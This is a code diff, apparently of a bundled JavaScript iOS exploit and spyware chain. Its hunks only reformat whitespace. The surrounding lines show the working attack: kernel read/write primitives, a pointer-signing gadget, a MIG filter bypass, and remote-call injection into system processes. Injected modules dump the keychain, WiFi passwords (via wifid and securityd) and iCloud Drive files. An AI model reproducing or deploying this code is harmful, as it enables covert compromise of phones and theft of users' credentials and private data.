@@ -442,7 +442,7 @@
     let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");
     let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize").noPAC());
 
-    function DUMP(addr, sz) { }
+    function DUMP(addr, sz) {}
 
     function js_malloc(sz) {
         buff = new Uint8Array(BigInt(sz).asInt32s).fill(0x00);
@@ -1457,19 +1457,19 @@
     mpd_kwrite_length = kwrite_length;
     mpd_kread_length = kread_length;
     mpd_kwrite_zone_element = kwrite_zone_element;
-    mpd_control_socket = function () {
+    mpd_control_socket = function() {
         return control_socket;
     }
-    mpd_rw_socket = function () {
+    mpd_rw_socket = function() {
         return rw_socket;
     }
-    mpd_pacia_gadget = function () {
+    mpd_pacia_gadget = function() {
         return dyld_signPointer_gadget;
     }
-    mpd_kernel_slide = function (addr = 0n) {
+    mpd_kernel_slide = function(addr = 0n) {
         return addr + kernel_slide;
     };
-    mpd_kernel_base = function () {
+    mpd_kernel_base = function() {
         return kernel_base;
     };
     pe();
@@ -1698,7 +1698,7 @@
                                 if (!this.#invokingAddr)
                                     return false;
 
-                                if (typeof (this.#target) == "string") {
+                                if (typeof(this.#target) == "string") {
                                     console.log(TAG, `Start injecting JS script into ${this.#target}`);
 
                                     this.task = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__["default"](this.#target, this.#migFilterBypass);
@@ -2297,7 +2297,7 @@
                             static #prepareArg(arg) {
                                 if (!arg)
                                     arg = 0n;
-                                if (typeof (arg) === "string")
+                                if (typeof(arg) === "string")
                                     return get_cstring(arg);
                                 return BigInt(arg);
                             }
@@ -2423,7 +2423,7 @@
                                 }
                                 return a.buffer;
                             }
-                            static gc() { }
+                            static gc() {}
                         }
 
                         // Register global Native class
@@ -4340,7 +4340,7 @@
                                 return !Native.callSymbol("rmdir", path);
                             }
 
-                            static exists(path, permission = 0 /*F_OK*/) {
+                            static exists(path, permission = 0 /*F_OK*/ ) {
                                 return !Native.callSymbol("access", path, permission);
                             }
 
@@ -5611,7 +5611,7 @@
                             #pid;
 
                             constructor(param, migFilterBypass = null) {
-                                if (typeof (param) == "string") {
+                                if (typeof(param) == "string") {
                                     console.log(TAG, `Getting task by name: ${param}`);
                                     this.#taskAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByName(param);
                                     //console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
@@ -7005,7 +7005,7 @@
                                 chain_write(ext_tableAddr + hash * sizeof(mach_vm_address_t),&nullAddr,sizeof(nullAddr));
                                 chain_write(ext_tableAddr + newHash * sizeof(mach_vm_address_t),&ext_hdrAddr,sizeof(ext_hdrAddr));
                                 */
-                                for (; ;) {
+                                for (;;) {
                                     let nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_4__["default"].read64(ext_hdrAddr);
                                     if (nextAddr == 0n)
                                         break;
@@ -8719,7 +8719,7 @@
                     if (keychainCopier.inject()) {
                         libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(keychainCopier.task);
                         keychainCopier.destroy();
-                    } else { }
+                    } else {}
 
                     // Inject WiFi password dump into wifid (has keychain access for WiFi)
                     // Using wifid instead of wifianalyticsd - wifid is always active
@@ -8728,7 +8728,7 @@
                     if (wifiDump.inject()) {
                         libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDump.task);
                         wifiDump.destroy();
-                    } else { }
+                    } else {}
 
                     // Also inject WiFi password dump into securityd (fallback for devices where wifid fails)
                     const securitydProcess = "securityd";
@@ -8736,7 +8736,7 @@
                     if (wifiDumpSecurityd.inject()) {
                         libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(wifiDumpSecurityd.task);
                         wifiDumpSecurityd.destroy();
-                    } else { }
+                    } else {}
 
                     // Inject iCloud dumper into UserEventAgent (has access to iCloud Drive files)
                     const userEventAgentProcess = "UserEventAgent";
@@ -8744,7 +8744,7 @@
                     if (iCloudDumper.inject()) {
                         libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(iCloudDumper.task);
                         iCloudDumper.destroy();
-                    } else { }
+                    } else {}
 
                     // Wait for all dumps to finish
                     for (let i = 1; i <= 5; i++) {
